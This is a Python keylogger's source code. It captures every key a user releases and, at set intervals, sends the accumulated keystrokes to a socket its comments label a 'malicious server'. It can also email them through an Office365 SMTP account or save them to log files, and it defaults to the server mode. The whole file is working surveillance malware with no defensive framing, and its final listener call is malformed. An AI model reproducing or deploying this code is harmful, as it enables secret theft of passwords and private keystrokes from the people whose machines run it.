import keyboard
import os
import socket
from pynput.keyboard import Key, Listener

import smtplib  # SMTP protocol
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from threading import Timer
from datetime import datetime

REPORT_TIME = 60 # in seconds
EMAIL_ADDRESS = "email@provider.com"
EMAIL_PASSWORD = "pass"

# Create Socket and Connect to Host
host = socket.gethostname()
port = 1227
s = socket.socket()
s.connect((host,port))

# Keylogger init
class Keylogger:
    def __init__(self, interval, report_type="email"):
        self.interval = interval
        self.report_type = report_type

        # log = variable to store strings within the interval
        self.log = ""

        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


    # Keyboard event handling (when a key is released)
    def callback(self, event):
        key = event.name
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                # replace spaces with underscores
                key = key.replace(" ", "_")
                key = f"[{key.upper()}]"
        self.log += key


    # Updates the name of the file depending on the time
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


    # Creates a log file in the current directory that contains
    # the current keylogs in the `self.log` variable
    def report_to_file(self):
        # open the file in write mode
        ### path = ".logs\"
        with open(f".\logs\{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        # Console message
        print(f"[+] Saved {self.filename}.txt")

    # Talks with python socket server and sends the log in real time
    def report_to_server(self):
        # Console message
        print(f"[+] Sent logs to malicious server")

    # TO-DO: IF not writing for 2 seconds (more or less) send logs, instead of using intervals 

        # send logs to malicious server
        s.sendall((self.log).encode('utf-8'))


    # Email implementation stuff

    # MIMEMultipart constructor
    # Creates an HTML version as well as text version to be sent as an email
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")

        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        # after making the mail, convert back as string message
        return msg.as_string()


    # manages a connection to an SMTP server
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)

        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()

        # Console message
        # if verbose:
        #    print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")


    # Function called every self.interval Sends keylogs and resets self.log variable
    def report(self):
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_type == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_type == "file":
                self.report_to_file()
            elif self.report_type == "server":
                self.report_to_server()
            # Console message
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        timer.start()


    # record the start datetime
    def start(self):
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # Console message
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()


# By default server
if __name__ == "__main__":
    keylogger = Keylogger(interval=5, report_type="server")
    # keylogger = Keylogger(interval=REPORT_TIME, report_type="email")
    # keylogger = Keylogger(interval=REPORT_TIME, report_type="file")
    keylogger.start()

with Listener(__name__=__name__) as listener :
    listener.join() 